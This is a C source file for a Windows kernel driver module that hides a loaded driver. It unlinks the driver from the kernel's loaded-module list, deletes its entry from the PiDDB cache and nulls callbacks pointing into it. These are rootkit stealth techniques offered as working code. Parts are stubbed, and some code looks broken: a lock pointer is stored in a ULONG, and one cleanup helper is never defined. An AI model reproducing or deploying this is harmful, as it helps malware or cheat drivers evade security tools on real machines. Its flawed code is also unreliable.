#include "driver_stealth.h"
#include "../common/utils.h"

// PiDDB structure
typedef struct _PIDDB_CACHE_ENTRY {
    LIST_ENTRY List;
    UNICODE_STRING DriverName;
    ULONG TimeDateStamp;
    NTSTATUS LoadStatus;
    char _PADDING_[4];
} PIDDB_CACHE_ENTRY, *PPIDDB_CACHE_ENTRY;

static NTSTATUS UnlinkDriverMemory(PVOID DriverBase) {
    PLIST_ENTRY PsLoadedModuleList = (PLIST_ENTRY)GetSystemRoutineAddress(L"PsLoadedModuleList");
    if (!PsLoadedModuleList) return STATUS_NOT_FOUND;

    PLIST_ENTRY current = PsLoadedModuleList->Flink;
    while (current != PsLoadedModuleList) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (entry->DllBase == DriverBase) {
            // Unlink from the chain
            RemoveEntryList(&entry->InLoadOrderLinks);
            RemoveEntryList(&entry->InMemoryOrderLinks);
            RemoveEntryList(&entry->InInitializationOrderLinks);
            return STATUS_SUCCESS;
        }
        current = current->Flink;
    }
    
    return STATUS_NOT_FOUND;
}

static NTSTATUS RemoveFromPiDDB(PUNICODE_STRING DriverName) {
    ULONG piddbLock = 0;
    PLIST_ENTRY piddbTable = NULL;
    
    // Get PiDDBLock and PiDDBCacheTable addresses (implementation needed)
    if (!GetPiDDBAddresses(&piddbLock, &piddbTable)) {
        return STATUS_NOT_FOUND;
    }

    ExAcquireResourceExclusiveLite((PERESOURCE)piddbLock, TRUE);
    
    PLIST_ENTRY current = piddbTable->Flink;
    while (current != piddbTable) {
        PPIDDB_CACHE_ENTRY entry = CONTAINING_RECORD(current, PIDDB_CACHE_ENTRY, List);
        if (RtlEqualUnicodeString(&entry->DriverName, DriverName, TRUE)) {
            RemoveEntryList(&entry->List);
            ExFreePool(entry);
            break;
        }
        current = current->Flink;
    }
    
    ExReleaseResourceLite((PERESOURCE)piddbLock);
    return STATUS_SUCCESS;
}

static NTSTATUS RemoveCallbacks(PSTEALTH_CONTEXT Context) {
    PVOID* callbacks = NULL;
    ULONG numberOfCallbacks = 0;
    
    // Get system callbacks (implementation needed)
    if (!GetSystemCallbacks(&callbacks, &numberOfCallbacks)) {
        return STATUS_NOT_FOUND;
    }

    for (ULONG i = 0; i < numberOfCallbacks; i++) {
        if (IsAddressInDriver(callbacks[i], Context->OriginalBase, Context->ImageSize)) {
            callbacks[i] = NULL;
        }
    }
    
    return STATUS_SUCCESS;
}

NTSTATUS ApplyDriverStealth(PVOID DriverBase, PUNICODE_STRING DriverName) {
    NTSTATUS status;

    // Memory unlinking
    status = UnlinkDriverMemory(DriverBase);
    if (!NT_SUCCESS(status)) return status;

    // PiDDB tampering
    status = RemoveFromPiDDB(DriverName);
    if (!NT_SUCCESS(status)) return status;

    // Handle table manipulation
    status = CleanupHandleReferences(DriverBase);
    if (!NT_SUCCESS(status)) return status;

    return STATUS_SUCCESS;
} 